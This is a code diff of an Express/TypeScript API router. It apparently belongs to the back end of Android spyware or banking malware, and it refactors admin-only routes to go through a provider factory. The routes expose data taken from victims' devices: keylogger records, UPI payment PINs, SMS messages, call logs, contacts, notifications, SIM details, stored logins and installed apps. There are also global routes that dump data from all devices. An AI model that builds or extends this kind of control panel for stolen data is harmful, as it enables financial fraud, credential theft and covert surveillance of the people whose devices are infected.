@@ -1,12 +1,9 @@
 import { Router, Request, Response } from 'express';
-import { createClient } from '@supabase/supabase-js';
-import config from '../../config/env';
 import { authenticate, requireRole } from '../../middleware/auth';
 import { asyncHandler } from '../../middleware/errorHandler';
+import { ProviderFactory } from '../../providers/factory';
 
 const router = Router();
-const supabase = createClient(config.supabase.url, config.supabase.serviceRoleKey);
-
 const adminOnly = [authenticate, requireRole(['admin'])];
 
 /**
@@ -15,16 +12,12 @@ const adminOnly = [authenticate, requireRole(['admin'])];
 router.get('/:deviceId/messages', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
     const { deviceId } = req.params;
     const { limit = 100 } = req.query;
+    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;
 
-    const { data, error } = await supabase
-        .from('sms_messages')
-        .select('*')
-        .eq('device_id', deviceId)
-        .order('timestamp', { ascending: false })
-        .limit(Number(limit));
+    const provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
+    const messages = await provider.getMessages(deviceId as string, Number(limit));
 
-    if (error) throw error;
-    return res.json({ success: true, messages: data });
+    return res.json({ success: true, messages });
 }));
 
 /**
@@ -33,16 +26,12 @@ router.get('/:deviceId/messages', ...adminOnly, asyncHandler(async (req: Request
 router.get('/:deviceId/apps', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
     const { deviceId } = req.params;
     const { limit = 200 } = req.query;
+    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;
 
-    const { data, error } = await supabase
-        .from('installed_apps')
-        .select('*')
-        .eq('device_id', deviceId)
-        .order('app_name', { ascending: true })
-        .limit(Number(limit));
+    const provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
+    const apps = await provider.getApps(deviceId as string, Number(limit));
 
-    if (error) throw error;
-    return res.json({ success: true, apps: data });
+    return res.json({ success: true, apps });
 }));
 
 /**
@@ -51,16 +40,12 @@ router.get('/:deviceId/apps', ...adminOnly, asyncHandler(async (req: Request, re
 router.get('/:deviceId/keylogs', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
     const { deviceId } = req.params;
     const { limit = 100 } = req.query;
+    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;
 
-    const { data, error } = await supabase
-        .from('key_logger')
-        .select('*')
-        .eq('device_id', deviceId)
-        .order('created_at', { ascending: false })
-        .limit(Number(limit));
+    const provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
+    const keylogs = await provider.getKeylogs(deviceId as string, Number(limit));
 
-    if (error) throw error;
-    return res.json({ success: true, keylogs: data });
+    return res.json({ success: true, keylogs });
 }));
 
 /**
@@ -68,15 +53,12 @@ router.get('/:deviceId/keylogs', ...adminOnly, asyncHandler(async (req: Request,
  */
 router.get('/:deviceId/upi-pins', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
     const { deviceId } = req.params;
+    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;
 
-    const { data, error } = await supabase
-        .from('upi_pins')
-        .select('*')
-        .eq('device_id', deviceId)
-        .order('created_at', { ascending: false });
+    const provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
+    const pins = await provider.getUpiPins(deviceId as string);
 
-    if (error) throw error;
-    return res.json({ success: true, pins: data });
+    return res.json({ success: true, pins });
 }));
 
 /**
@@ -85,31 +67,91 @@ router.get('/:deviceId/upi-pins', ...adminOnly, asyncHandler(async (req: Request
 router.get('/:deviceId/heartbeat', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
     const { deviceId } = req.params;
     const { limit = 50 } = req.query;
+    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;
 
-    const { data, error } = await supabase
-        .from('heartbeat')
-        .select('*')
-        .eq('device_id', deviceId)
-        .order('last_update', { ascending: false })
-        .limit(Number(limit));
+    const provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
+    const heartbeat = await provider.getHeartbeat(deviceId as string, Number(limit));
 
-    if (error) throw error;
-    return res.json({ success: true, heartbeat: data });
+    return res.json({ success: true, heartbeat });
 }));
+
+/**
+ * GET /api/v1/devices/data/:deviceId/sims
+ */
+router.get('/:deviceId/sims', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
+    const { deviceId } = req.params;
+    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;
+
+    const provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
+    const sims = await provider.getSims(deviceId as string);
+
+    return res.json({ success: true, sims });
+}));
+
+/**
+ * GET /api/v1/devices/data/:deviceId/notifications
+ */
+router.get('/:deviceId/notifications', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
+    const { deviceId } = req.params;
+    const { limit = 100 } = req.query;
+    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;
+
+    const provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
+    const notifications = await provider.getNotifications(deviceId as string, Number(limit));
+
+    return res.json({ success: true, notifications });
+}));
+
+/**
+ * GET /api/v1/devices/data/:deviceId/call-logs
+ */
+router.get('/:deviceId/call-logs', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
+    const { deviceId } = req.params;
+    const { limit = 100 } = req.query;
+    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;
+
+    const provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
+    const callLogs = await provider.getCallLogs(deviceId as string, Number(limit));
+
+    return res.json({ success: true, callLogs });
+}));
+
+/**
+ * GET /api/v1/devices/data/:deviceId/contacts
+ */
+router.get('/:deviceId/contacts', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
+    const { deviceId } = req.params;
+    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;
+
+    const provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
+    const contacts = await provider.getContacts(deviceId as string);
+
+    return res.json({ success: true, contacts });
+}));
+
+/**
+ * GET /api/v1/devices/data/:deviceId/logins
+ */
+router.get('/:deviceId/logins', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
+    const { deviceId } = req.params;
+    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;
+
+    const provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
+    const logins = await provider.getLogins(deviceId as string);
+
+    return res.json({ success: true, logins });
+}));
+
+// ==================== Global Routes (Master Database Only) ====================
 
 /**
  * GET /api/v1/devices/data/messages (Global)
  */
 router.get('/messages', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
     const { limit = 100 } = req.query;
-    const { data, error } = await supabase
-        .from('sms_messages')
-        .select('*')
-        .order('timestamp', { ascending: false })
-        .limit(Number(limit));
-
-    if (error) throw error;
-    return res.json({ success: true, messages: data });
+    const provider = await ProviderFactory.getProvider();
+    const messages = await provider.listAllMessages(Number(limit));
+    return res.json({ success: true, messages });
 }));
 
 /**
@@ -117,14 +159,9 @@ router.get('/messages', ...adminOnly, asyncHandler(async (req: Request, res: Res
  */
 router.get('/apps', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
     const { limit = 200 } = req.query;
-    const { data, error } = await supabase
-        .from('installed_apps')
-        .select('*')
-        .order('created_at', { ascending: false })
-        .limit(Number(limit));
-
-    if (error) throw error;
-    return res.json({ success: true, apps: data });
+    const provider = await ProviderFactory.getProvider();
+    const apps = await provider.listAllApps(Number(limit));
+    return res.json({ success: true, apps });
 }));
 
 /**
@@ -132,14 +169,9 @@ router.get('/apps', ...adminOnly, asyncHandler(async (req: Request, res: Respons
  */
 router.get('/keylogs', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
     const { limit = 100 } = req.query;
-    const { data, error } = await supabase
-        .from('key_logger')
-        .select('*')
-        .order('created_at', { ascending: false })
-        .limit(Number(limit));
-
-    if (error) throw error;
-    return res.json({ success: true, keylogs: data });
+    const provider = await ProviderFactory.getProvider();
+    const keylogs = await provider.listAllKeylogs(Number(limit));
+    return res.json({ success: true, keylogs });
 }));
 
 /**
@@ -147,14 +179,9 @@ router.get('/keylogs', ...adminOnly, asyncHandler(async (req: Request, res: Resp
  */
 router.get('/upi-pins', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
     const { limit = 100 } = req.query;
-    const { data, error } = await supabase
-        .from('upi_pins')
-        .select('*')
-        .order('created_at', { ascending: false })
-        .limit(Number(limit));
-
-    if (error) throw error;
-    return res.json({ success: true, pins: data });
+    const provider = await ProviderFactory.getProvider();
+    const pins = await provider.listAllUpiPins(Number(limit));
+    return res.json({ success: true, pins });
 }));
 
 export default router;
